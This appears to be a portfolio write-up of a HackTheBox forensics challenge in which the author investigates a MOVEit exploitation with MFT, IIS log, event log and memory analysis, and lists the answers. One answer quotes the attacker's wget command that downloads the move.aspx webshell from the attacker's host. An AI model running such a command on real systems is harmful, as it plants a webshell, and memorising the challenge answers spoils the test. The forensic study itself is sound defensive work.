---
{"dg-publish":true,"permalink":"/portfolio/i-like-to/"}
---

###### Summary: 

*I-like-to* is one of the first Sherlocks HTB has published. Despite being ranked as easy, it still provides a good learning value for a beginner. While working on this challenge, I have acquainted with MOVEit vulnerability, analysed KAPE artifacts, including MFT file, correlated data with raw hex, and answered relevant questions regarding the exploitation of the vulnerability.

###### Challenge scenario: 

"We have unfortunately been hiding under a rock and do not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details, so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artefacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here..."

###### Walkthrough:

1. *Name of the ASPX webshell uploaded by the attacker?*
	I parcelled MFT using MFTCmd and then opened it with TimeLine Explorer. The first question is to find ASPX web shell, I filtered files' extension to .aspx and the first file in the output had missing 0x30 ($Filename information) timestamp which indicates that it was likely uploaded from a different host. 
	
	Answer: move.aspx

2. *What was the attacker's IP address?*
	To find the attacker's IP address I had to find Microsoft Internet Information Service, open it with a text editor and find the uploaded file. Also, there are a lot of signs of network enumeration conducted by the threat actor. 
	
	It's worth noting that I've tried to find the IP address initially by multiplying the file's entry number by 1024 and converting it to hex, then looking for this offset number in the MFT hex dump (using HxD). Also, by running `Get-Item (file path) -Stream *` and `Get-Content`. Yet this method is more suitable for analysing Zone.Identifier data. 
	
	Answer: 10.255.254.3

3. *What user agent was used to perform the initial attack?*
	I continued investigating IIS logs and indicators of compromise for the exploit. I found one of them (machine2.aspx) in the logs and User Agent in the lines below. 
	
	Answer: Ruby

4. *When was the ASPX webshell uploaded by the attacker?*
	Using Timeline Explorer, I returned to the first file I had found, looked at its entry number and investigated its timestamps, then used MFTECmd (particular attention to $FILE_NAME or 0x30 information) to identify the time when the script was uploaded.
	
	Answer: 12/07/2023 11:24:30
	
	`.\MFTECmd -f 'C:\Users\glebas\Desktop\$MFT' --de 1293` ![Pasted image 20250210105019.png](/img/user/Pasted%20Images/Pasted%20image%2020250210105019.png)

5. *The attacker uploaded an ASP webshell which didn't work, what is its filesize in bytes?*
	Filtered MFT entries to display the same day when 'move.aspx' was uploaded. The next entry is another malicious file 'moveit.asp' and it has file size specified in the entry.
	
	Answer: 1362

6. *Which tool did the attacker use to initially enumerate the vulnerable server?*
	Numerous attempts of port enumeration using nmap can be seen in IIS and DMZ_FTP log files
	
	Answer: nmap

7. *We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC)*
	Using EvtxECmd I converted directory with Windows event logs (included logs IDs related to password change 4723, 4724... etc) into a CSV file, opened it with Timeline Explorer and found there service account password attempt with ID 4724.
	
	Answer: 12/07/2023 11:09:27

8. *Which protocol did the attacker utilize to remote into the compromised machine?*
	To identify internet protocol the adversary used to connect, I had to re-process evtx logs once again including all the events this time (with the thought of the future usage). Then, I filtered events 4624 that identify successful connections and using logon type 10 is typically mark of RDP connection.
	
	Answer: RDP

9. *Please confirm the date and time the attacker remotely accessed the compromised machine*
	Timestamp can be found in previous question.
	
	Answer: 12/07/2023 11:11:18

10. *What was the useragent that the attacker used to access the webshell?*
	The user agent can be found in IIS logs, in particular near malicious files with GET or POST requests.
	
	Answer: Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0

11. *What is the inst ID of the attacker?*
    I installed MySQL server and workbench to analyse moveit.sql file and found the ID among the entries. You shall look for attacker's nickname.
    
    Answer: 1234

12. What command was run by the attacker to retrieve the webshell?
	Answer: wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx

13. *What was the string within the title header of the webshell deployed by the TA?*
	To find a header I used command `strings "C:\Users\glebas\Desktop\I-like-to-27a787c5.vmem" | Select-String "move.aspx" -Context 20, 20` -- it allows to see 20 lines above and below from the target line (move.aspx) in this case.
	
	Answer: awen asp.net webshell

14. *What did the TA change the our moveitsvc account password to?*
	I found new password by conducting strings analysis of vmem file and with the search for "net user 'moveitsvc" because password follows it
	
	Answer: 5trongP4ssw0rd


